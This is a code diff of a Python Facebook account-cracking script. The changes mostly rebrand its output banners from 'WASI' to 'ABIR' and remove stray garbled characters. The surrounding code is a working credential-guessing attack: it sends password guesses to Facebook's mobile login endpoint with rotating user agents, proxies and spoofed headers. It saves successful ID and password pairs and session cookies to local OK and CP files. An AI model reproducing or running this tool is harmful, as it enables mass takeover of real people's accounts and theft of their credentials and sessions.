@@ -584,7 +584,7 @@ def setting():
 		method.append('mbasic')
 	else:
 		method.append('mobile')
-	print(f'{m}NOTE :\nðŸ™„{k}USE DEFULT PASS MENU ') 
+	print(f'{m}NOTE :\n{k}USE DEFULT PASS MENU ') 
 	print('')
 	_jembot_ = input('=>SHOW APKS ( Y/t ) ')
 #	if _jembot_ in ['']:
@@ -597,7 +597,7 @@ def setting():
 	pwplus=input('=>PASWORD MENU MENUAL(CHOISE)/DEFULT(AUTO)( m/d ) ')
 	if pwplus in ['y','Y']:
 		pwpluss.append('ya')
-		cetak(nel('[[purple]â€¢[yellow]] ADD PASWORD MXM 6 WORDS\n[[purple]â€¢[yellow]] EXIMPLE :[green] 556677,786786,123456[purple] '))
+		cetak(nel('[[purple][yellow]] ADD PASWORD MXM 6 WORDS\n[[purple][yellow]] EXIMPLE :[green] 556677,786786,123456[purple] '))
 		pwku=input('#=>Add PASSWORDS : ')
 		pwkuh=pwku.split(',')
 		for xpw in pwkuh:
@@ -658,8 +658,8 @@ def passwrd():
 				pool.submit(crack,idf,pwv)
 	print('')
 	cetak(nel('\t[purple]=>[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[purple] <<[yellow] '))
-	print(f'[{h}â€¢{u}]{h} OK : {h}%s '%(ok))
-	print(f'{k}[{k}â€¢{h}]{k} CP : {k}%s{u} '%(cp))
+	print(f'[{h}{u}]{h} OK : {h}%s '%(ok))
+	print(f'{k}[{k}{h}]{k} CP : {k}%s{u} '%(cp))
 	print('')
 	print('{k}=>Lanjut Crack Kembali ( Y/t ) ? ')
 	woi = input('=>Pilih : ')
@@ -673,7 +673,7 @@ def passwrd():
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r{b}WASI-XD-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]â€”{P}[{H}{ok}{P}]â€”{P}[{k}{cp}{x}]â€”[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+	sys.stdout.write(f"\r{b}ABIR-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]{P}[{H}{ok}{P}]{P}[{k}{cp}{x}][{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -690,7 +690,7 @@ def crack(idf,pwv):
 			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
 			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				cetak(nel('  [red]     âœ¨ WASI-CHECKPOINT âœ¨ [red]'))
+				cetak(nel('  [red]     ¨ ABIR -CP💔 ¨ [red]'))
 				print(f'\r{K}>> {idf}|{pw}{N}')     
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
@@ -700,7 +700,7 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				cetak(nel('[green]      â¤ï¸âœ¨ WASI-OK â¤ï¸âœ¨[green]')) 
+				cetak(nel('[green]      ¨ ABIR-OK🥰 ¨[green]')) 
 				print(f'\r{H}>> {idf}|{pw}|{kuki}\n{ua}{N}')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(session,coki)
@@ -714,7 +714,7 @@ def crack(idf,pwv):
 #------------------[ METHODE-MBASIC-2 ]-------------------#
 def crackfree(idf,pwv):
 	global loop,ok,cp
-	sys.stdout.write(f"\râ¤ï¸ {P}[{asu}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]â€”{P}[{H}{ok}{P}]â€”{P}[{k}{cp}{x}]â€”[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+	sys.stdout.write(f"\râ¤ï¸ {P}[{asu}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]{P}[{H}{ok}{P}]{P}[{k}{cp}{x}][{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
